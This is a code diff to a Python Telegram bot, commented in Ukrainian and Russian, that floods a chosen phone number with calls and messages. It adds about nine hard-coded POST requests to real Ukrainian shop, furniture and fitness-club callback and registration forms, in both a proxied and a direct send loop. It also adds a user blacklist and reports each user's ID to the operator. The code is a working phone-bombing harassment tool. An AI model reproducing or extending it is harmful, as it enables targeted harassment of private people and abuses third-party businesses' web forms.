@@ -28,6 +28,10 @@ running_spams_per_chat_id = []
 
 print('Bot has started! You can use him.')
 
+def black_list_add(idd):
+    with open('black_list.txt', 'a') as f:
+        f.write(f'{idd}\n')
+
 def save_chat_id(chat_id):
     "Функция добавляет чат айди в файл если его там нету"
     chat_id = str(chat_id)
@@ -210,6 +214,15 @@ def send_for_number_https(aa):
         d = requests.post('https://pit-jey.com/index.php?route=extension/module/cyber_callback',headers=headers,proxies=proxies, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','comment_buyer': '','url_site': 'https://pit-jey.com/ua/simpleregister/','action': 'send'})
         d = requests.post('https://med-magazin.ua/ajax/call/set/',headers=headers,proxies=proxies, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         d = requests.post('https://air-conditioner.ua/page/page/mail-callback',headers=headers,proxies=proxies, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://aber.com.ua/feedback/callback',headers=headers, proxies=proxies, data={'firstname': name,'cellphone': number_plus,'time_info': '','isAjaxForm': 'callbackForm','isAjax': '1'})
+        d = requests.post('https://welovemebel.com.ua/ajax/auth_register.php', proxies=proxies, headers=headers,data={'USER_LOGIN': number_plus,'USER_EMAIL': email,'SECRET': 'secretcode'})
+        d = requests.post('https://atmo.ua/feedback/callback',headers=headers, proxies=proxies, data={'firstname': name,'cellphone': number_plus,'isAjaxForm': 'callbackForm','isAjax': '1'})
+        d = requests.post('https://carta.ua/api/v1.0/register/user',headers=headers, proxies=proxies, json={"username": name,"phone": f'({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"plainPassword": {"first": password,"second": password},"confirmType": "phone"})
+        d = requests.post('https://e-ukrservice.com/index.php?route=common/callbacks/send',headers=headers, proxies=proxies, data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','url': 'https://e-ukrservice.com/ru/lantsyugovi-pyly/?gclid=Cj0KCQjwvZCZBhCiARIsAPXbaju7thYMTzoU8CcNrAnukdwhF3L7csqNTl4KiLozmn71z0LUVD36MN4aAvSoEALw_wcB','form': 'header_callback'})
+        d = requests.post('https://fitness-club.lviv.ua/wp-content/themes/fitnes/mail.php',headers=headers, proxies=proxies, data={'name': name,'tel': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}','adress': 'chor'})
+        d = requests.post('https://webapi.sportlife.ua/landing-form-submissions',headers=headers, proxies=proxies, json={"utm_source": 'null',"utm_medium": 'null',"utm_campaign": 'null',"utm_term": 'null',"utm_content": 'null',"remote_addr": "178.92.20.29","club_id": "18","club_name": "Героїв УПА","city_id": "41","club_raw": "ЛВУ","comment_1": "Регистрации с конструктора абонементов (New site)","name": name,"patronymic": "","surname": "","birthday": "","phone": f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"email": "","address": "","club": "28","city": "2","acceptment": True})
+        d = requests.post('http://kirbud.com.ua/index.php?route=extension/module/callback',headers=headers, proxies=proxies, data={'name': '','phone': number_plus,'comment': '','action': 'send'})
+
         coun+=1
         print(f'Круг {coun}')
     except:
@@ -333,15 +346,24 @@ def send_for_number(aa):
         d = requests.post('https://pit-jey.com/index.php?route=extension/module/cyber_callback',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','comment_buyer': '','url_site': 'https://pit-jey.com/ua/simpleregister/','action': 'send'})
         d = requests.post('https://med-magazin.ua/ajax/call/set/',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         d = requests.post('https://air-conditioner.ua/page/page/mail-callback',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://aber.com.ua/feedback/callback',headers=headers,data={'firstname': name,'cellphone': number_plus,'time_info': '','isAjaxForm': 'callbackForm','isAjax': '1'})
+        d = requests.post('https://welovemebel.com.ua/ajax/auth_register.php',headers=headers,data={'USER_LOGIN': number_plus,'USER_EMAIL': email,'SECRET': 'secretcode'})
+        d = requests.post('https://atmo.ua/feedback/callback',headers=headers,data={'firstname': name,'cellphone': number_plus,'isAjaxForm': 'callbackForm','isAjax': '1'})
+        d = requests.post('https://carta.ua/api/v1.0/register/user',headers=headers,json={"username": name,"phone": f'({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"plainPassword": {"first": password,"second": password},"confirmType": "phone"})
+        d = requests.post('https://e-ukrservice.com/index.php?route=common/callbacks/send',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','url': 'https://e-ukrservice.com/ru/lantsyugovi-pyly/?gclid=Cj0KCQjwvZCZBhCiARIsAPXbaju7thYMTzoU8CcNrAnukdwhF3L7csqNTl4KiLozmn71z0LUVD36MN4aAvSoEALw_wcB','form': 'header_callback'})
+        d = requests.post('https://fitness-club.lviv.ua/wp-content/themes/fitnes/mail.php',headers=headers,data={'name': name,'tel': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}','adress': 'chor'})
+        d = requests.post('https://webapi.sportlife.ua/landing-form-submissions',headers=headers,json={"utm_source": 'null',"utm_medium": 'null',"utm_campaign": 'null',"utm_term": 'null',"utm_content": 'null',"remote_addr": "178.92.20.29","club_id": "18","club_name": "Героїв УПА","city_id": "41","club_raw": "ЛВУ","comment_1": "Регистрации с конструктора абонементов (New site)","name": name,"patronymic": "","surname": "","birthday": "","phone": f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"email": "","address": "","club": "28","city": "2","acceptment": True})
+        d = requests.post('http://kirbud.com.ua/index.php?route=extension/module/callback',headers=headers,data={'name': '','phone': number_plus,'comment': '','action': 'send'})
+
         coun+=1
         print(f'Круг {coun}')
     except:
         pass
     print('все')
 
-def start_spam(chat_id, phone_number, force,second,prox,name):
+def start_spam(chat_id, phone_number, force,second,prox,name,user_id):
     running_spams_per_chat_id.append(chat_id)
-    bot.send_message(5112839866,f'{name} почав спам на номер {phone_number} і на {second} секунд')
+    bot.send_message(5112839866,f'{name} почав спам на номер {phone_number} і на {second} секунд\nЙого айді: {user_id}')
 
 
     bot.send_message(chat_id, f'<b>👨‍💻Номер телефона: {phone_number}\n🙈Таймер: на {second} секунд\n😄Спам успішно почався!</b>', parse_mode='HTML')
@@ -372,13 +394,13 @@ def start_spam(chat_id, phone_number, force,second,prox,name):
     except Exception:
         pass
 
-def spam_handler(phone, chat_id,sec,prox,name,force=False):
+def spam_handler(phone, chat_id,sec,prox,name,user_id,force=False):
     if int(chat_id) in running_spams_per_chat_id:
         bot.send_message(chat_id, 'Ви вже почали спам. Дочекайтесь закінчення або нажміть ❌Зупинити спам і поробуйте знов')
         return
 
     if THREADS_AMOUNT[0] < THREADS_LIMIT:
-        x = threading.Thread(target=start_spam, args=(chat_id, phone, force,sec,prox,name))
+        x = threading.Thread(target=start_spam, args=(chat_id, phone, force,sec,prox,name,user_id))
         threads.append(x)
         THREADS_AMOUNT[0] += 1
         x.start()
@@ -386,11 +408,12 @@ def spam_handler(phone, chat_id,sec,prox,name,force=False):
         bot.send_message(chat_id, 'Сервера зараз перегружені. Попробуйте знов через пару хвилин.')
 
 @bot.message_handler(content_types=['text'])
-def handle_message_received(message):
+def handle_message_received(message: types.Message):
     try:
         chat_id = int(message.chat.id)
         text = message.text
         name = message.from_user.first_name
+        user_id = message.from_user.id
     
         if text == '🤖Інформація':
             save_chat_id(chat_id)
@@ -478,21 +501,29 @@ def handle_message_received(message):
             send_message_users(msg)
         
         elif len(text) >= 12 <= 19:
+            with open('black_list.txt', 'r') as f:
+                black = f.read().split()
             save_chat_id(chat_id)
             if '380' in text:
                 sec = message.text.split()[1]
                 prox = message.text.split()[2]
                 num = message.text.split()[0]
-                if num == '380989509257':
+                if str(user_id) in black:
                     bot.send_message(chat_id,'Цей номер в чорному списку.')
                 else:
-                    spam_handler(num, chat_id,sec,prox,name)
+                    spam_handler(num, chat_id,sec,prox,name,user_id)
+            elif '+380' in text:
+                bot.send_message(chat_id, 'Треба вводити без +')
+            elif 'Додати ' in text and text.split()[1] not in black:
+                black_list_add(text.split()[1])
             else:
                 bot.send_message(chat_id,'❌Номер не правильно введений!\nВін має починатися з 380')
                 
         elif text == 'БД' and chat_id==ADMIN_CHAT_ID:
             bot.send_document(chat_id,open('chat_ids.txt', 'rb'))
             
+        elif text == 'ЧС' and chat_id==ADMIN_CHAT_ID:
+            bot.send_document(chat_id,open('black_list.txt', 'rb'))
 
         else:
             save_chat_id(chat_id)
